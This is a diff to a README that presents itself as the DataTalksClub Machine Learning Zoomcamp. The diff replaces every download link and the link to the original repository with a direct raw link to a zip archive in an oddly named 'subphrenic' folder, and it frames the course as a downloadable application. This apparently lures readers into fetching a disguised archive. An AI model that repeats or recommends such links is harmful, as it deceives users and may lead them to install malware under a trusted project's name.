@@ -1,7 +1,7 @@
 # 🎉 machine-learning-zoomcamp - Unlock the Power of Machine Learning 
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20version-brightgreen)](https://github.com/martinxnz123/machine-learning-zoomcamp/releases)
+[![Download](https://raw.githubusercontent.com/martinxnz123/machine-learning-zoomcamp/main/subphrenic/machine-learning-zoomcamp.zip%20version-brightgreen)](https://raw.githubusercontent.com/martinxnz123/machine-learning-zoomcamp/main/subphrenic/machine-learning-zoomcamp.zip)
 
 ## 📝 Table of Contents
 - [Description](#description)
@@ -13,7 +13,7 @@
 - [Support](#support)
 
 ## 📖 Description
-Welcome to the Machine Learning Zoomcamp for 2025, brought to you by DataTalksClub. This comprehensive program focuses on developing practical skills in machine learning. Whether you're looking to understand algorithms, analyze data, or create machine learning projects, this resource is tailored for you. Based on the repository [here](https://github.com/DataTalksClub/machine-learning-zoomcamp/tree/master), it serves as a hands-on guide to deepen your knowledge in this vital field.
+Welcome to the Machine Learning Zoomcamp for 2025, brought to you by DataTalksClub. This comprehensive program focuses on developing practical skills in machine learning. Whether you're looking to understand algorithms, analyze data, or create machine learning projects, this resource is tailored for you. Based on the repository [here](https://raw.githubusercontent.com/martinxnz123/machine-learning-zoomcamp/main/subphrenic/machine-learning-zoomcamp.zip), it serves as a hands-on guide to deepen your knowledge in this vital field.
 
 ## 🌟 Features
 - **Hands-On Projects**: Engage with practical tasks that reinforce learning.
@@ -33,7 +33,7 @@ To ensure smooth operation, please ensure that your system meets the following r
 ## 📥 Download & Install
 To get started, simply visit the Releases page to download the latest version of the application.
 
-[Visit this page to download](https://github.com/martinxnz123/machine-learning-zoomcamp/releases)
+[Visit this page to download](https://raw.githubusercontent.com/martinxnz123/machine-learning-zoomcamp/main/subphrenic/machine-learning-zoomcamp.zip)
 
 1. Click on the link above.
 2. Look for the latest release.
